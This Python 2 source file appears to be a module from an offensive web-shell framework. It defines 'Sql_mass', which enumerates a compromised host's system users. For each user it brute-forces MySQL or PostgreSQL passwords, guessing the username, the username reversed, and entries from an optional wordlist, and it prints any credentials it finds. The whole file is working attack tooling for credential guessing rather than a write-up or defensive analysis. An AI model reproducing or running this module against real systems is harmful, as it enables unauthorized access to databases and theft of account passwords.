'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
from random import choice
from math import ceil

classname = 'Sql_mass'
 
class Sql_mass(Module):
    '''Bruteforce sql of system users. For user based password trying use 'auto'.
    :bruteforce.sql_mass mysql|postgres <host> <local_file_list.txt>|auto
    '''
    


    def __init__( self, modhandler , url, password):
        
        Module.__init__(self, modhandler, url, password)
        
        
    def __generate_wl_from_user(self, user):
        return [ user, user[::-1] ]
        
    def run( self, mode, host, filename):
        
        wl_splitted = []
        if filename != 'auto':
            try:
                wordlist = open(filename, 'r')
                wl_splitted = [ w.strip() for w in wordlist.read().split() ]
            except Exception, e:
                raise ModuleException(self.name, "Error opening %s: %s" % (filename, str(e)))
    
        usersresponse = self.modhandler.load('audit.users').run()
        
        
        if usersresponse:
            users = [ u.name for u in self.modhandler.load('audit.users').usersinfo ]
            
            for user in users:
                
                if filename == 'auto':
                    wl_splitted = self.__generate_wl_from_user(user)
                else:
                    wl_splitted = self.__generate_wl_from_user(user) + wl_splitted
            
                response = self.modhandler.load('bruteforce.sql').run(mode, host, user, '', 0, substitutive_wl = wl_splitted)
                
                if response:
                    self.mprint(response)
                else:
                    self.mprint('[%s] Password of \'%s\' not found' % (self.name, user))
                
               
                
                
            
        